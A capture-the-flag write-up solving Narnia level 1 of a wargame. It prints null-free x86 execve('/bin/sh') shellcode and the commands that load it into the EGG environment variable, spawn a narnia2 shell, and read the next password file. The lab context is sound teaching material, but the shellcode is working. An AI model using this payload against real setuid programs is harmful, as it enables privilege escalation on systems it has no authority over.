Wargame: Narnia

Level: 1

Category: Binary Exploitation

Description

The binary at /narnia/narnia1 reads the EGG environment variable, casts it to a function pointer, and calls it. The goal is to store x86 shellcode in EGG to spawn a shell running as narnia2.

Overview

  • The binary does ret = getenv("EGG"); ret();: it treats the value of EGG as executable code.
  • We store position-independent x86 shellcode in EGG.
  • When the binary calls ret(), execution jumps to our shellcode, which executes execve("/bin/sh", ...).
  • Since the binary is setuid narnia2, the resulting shell runs with narnia2 privileges.

Background: Shellcode via Environment Variables

  • Environment variables are stored in process memory alongside the stack.
  • A function pointer cast from a char* environment variable and then called transfers execution to that memory address.
  • Position-independent shellcode (no hardcoded addresses) works regardless of where the variable lands in memory.
  • The shellcode used here is a standard execve("/bin/sh") payload encoded to avoid null bytes.

Solution

Step 1: Prepare the Shellcode

  • Use a null-byte-free x86 execve("/bin/sh") shellcode; a self-decoding variant avoids zero bytes that would terminate getenv.
shellcode = (
    r"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01"
    r"\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"
    r"\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53"
    r"\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f"
    r"\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"
)

Step 2: Set EGG and Execute the Binary

  • Export EGG with the shellcode bytes, then run narnia1 in the same shell session.
cmd = f"export EGG=`echo -e '{shellcode}'` && ./narnia1"
channel = ssh.system(cmd)

Step 3: Read the Next Password

  • The shellcode spawns a shell with narnia2 privileges.
  • Send commands over the channel to read the password file.
channel.sendline(b"cat /etc/narnia_pass/narnia2")
result = channel.recv().decode().strip()

Password

Obtained by running cat /etc/narnia_pass/narnia2 inside the spawned shell.
